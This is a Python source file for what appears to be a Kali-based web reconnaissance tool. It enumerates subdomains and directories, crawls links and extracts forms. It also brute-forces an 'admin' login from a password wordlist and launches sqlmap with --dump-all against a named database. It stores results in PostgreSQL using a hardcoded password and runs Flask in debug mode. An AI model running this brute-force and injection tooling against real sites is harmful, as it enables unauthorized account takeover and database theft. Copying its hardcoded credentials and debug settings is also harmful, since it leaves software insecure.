#!/usr/bin/python3

import requests
import argparse
import subprocess
from flask import Flask, render_template
import psycopg2 # import the PostgreSQL adapter for Python
import urllib.parse as urlparse
from bs4 import BeautifulSoup
import re

def get_arguments():
    parser = argparse.ArgumentParser(prog="Subdomain_enumerator", description="Tool to discover subdomains")
    parser.add_argument("-u", "--URL", dest="target_url", help="Target URL you would like to enumerate its subdomains")
    return parser.parse_args()


user_choice=input("Select enum to perform: \n\n 1)Subdomain [url WITHOUT http://] \n\n 2)Discover_Path [url must start with 'https://'] \n\n 3)Guess_Password [full url with the login directory: https://example.com/login/] \n\n 4)GET_form_FIELDS_in_HTML [example url: 'https://facebook.com'] \n\n 5)Directory_enum [url WITH https://] \n\n 6)SQLCheck \n\n $: ")

def request(url):
    try:
        return requests.get(url) #This function will get the response code of the url provided 
    except requests.exceptions.ConnectionError: #usuallly there's an exception that happens when there's a connection error so we're telling python to pass if it happenes.
        pass

#Connection to Database
def save_to_database(test_url):
    # Connect to the database
    conn = psycopg2.connect(
        host="127.0.0.1",
        port=5432,
        database="pgda",
        user="postgres",
        password="1234conn"
    )
    cursor = conn.cursor()

    # Insert DATA into the table
    cursor.execute("INSERT INTO subdomains (name) VALUES (%s)", (test_url,))
    conn.commit()
    #cursor.execute("SELECT * FROM subdomains")
    #rows = cursor.fetchall()
    #for row in rows:
     #   print(row)

    # Close the connection to the database
    cursor.close()
    conn.close()

#Get URL from user input 
args = get_arguments()
user_URL= args.target_url

app = Flask(__name__)

def sqlinjection_test():
    subprocess.run(["sqlmap","-r","/home/kali/python-web-scanning-tool-main/req.txt","-p","blood_group","--dbs","-D","blood","-T","blood_db","--columns","--users","--dump-all","--current-user"])

#directory_enum
def directory_enum(user_URL):
    with open("/home/kali/python-web-scanning-tool-main/wordlists/directories-wordlist.txt", "r") as wordlist:
        for line in wordlist:
            word = line.strip()
            test_url = user_URL + "/" + word
            response = request(test_url)
            if response:
                save_to_database(test_url)
                print(" [+] Discovered URL -->" + test_url)

#GuessPass #protip do not show passwords on websites
def guess_password(user_URL):
    data_dict = {"username": "admin", "password": "", "login": "submit"}
    with open("/home/kali/python-web-scanning-tool-main/wordlists/passwords-wordlist.txt", "r") as wordlist:
        for line in wordlist:
            word = line.strip()
            data_dict["password"] = word
            response = requests.post(user_URL, data=data_dict)
            if 'Login failed'.encode('utf-8') not in response.content:
                print("[+] Got the password --> " + word)
                save_to_database(word)
                exit()
    print("[+] Reached end of line.")

#Get forms from an html page #this can't be saved and dispalyed into a website because it returns a from html elemnt
def get_form(user_URL):
    response = request(user_URL)
    parsed_html = BeautifulSoup(response.content, 'html5lib')
    forms_list = parsed_html.findAll("form")
    print(forms_list)

#DISCOVER_PATH
class MyClass:
    def __init__(self, url):
        self.target_url = url
        self.target_links = []
        #self.links_to_ignore = []
        #self.session = session
    
    def extract_links_from(self, url):
        response = requests.get(url)
        return re.findall('(?:href=")(.*?)"', response.content.decode(errors='ignore'))

    def crawl(self, url=None):
        if url == None:
            url = self.target_url
        href_links = self.extract_links_from(url)
        for link in href_links:
            link = urlparse.urljoin(url, link)

            if "#" in link:
                link = link.split("#")[0]

            if self.target_url in link and link not in self.target_links:
                self.target_links.append(link)
                print(link)
                self.crawl(link)

#Subdomain enumeration
if user_choice=="1":
    @app.route("/")
    def main():
        subdomains = []
        with open("/home/kali/python-web-scanning-tool-main/wordlists/subdomains-wodlist.txt", "r") as wordlist:
            for line in wordlist:
                word = line.strip()
                test_url = "http://" + word + "." + user_URL
                response = request(test_url)
                if response:
                    save_to_database(test_url)
                    subdomains.append(test_url)
        return render_template("index.html", subdomains=subdomains)
    if __name__ == "__main__":
        app.run(debug=True, use_reloader=False)

#DISCOVER_PATH
elif user_choice=="2":
    @app.route("/")
    def crawl_results():
        #session = requests.Session()
        my_class = MyClass(user_URL)
        my_class.crawl(user_URL)
        return render_template("index.html", subdomains=my_class.target_links)
    if __name__ == "__main__":
        app.run(debug=True, use_reloader=False)

#GUESS_PASSWORD
elif user_choice=="3":
    guess_password(user_URL)

#GET_FORM
elif user_choice=="4":
    get_form(user_URL)

#Directory_enum
elif user_choice=="5":
    directory_enum(user_URL)

elif user_choice=="6":
    sqlinjection_test()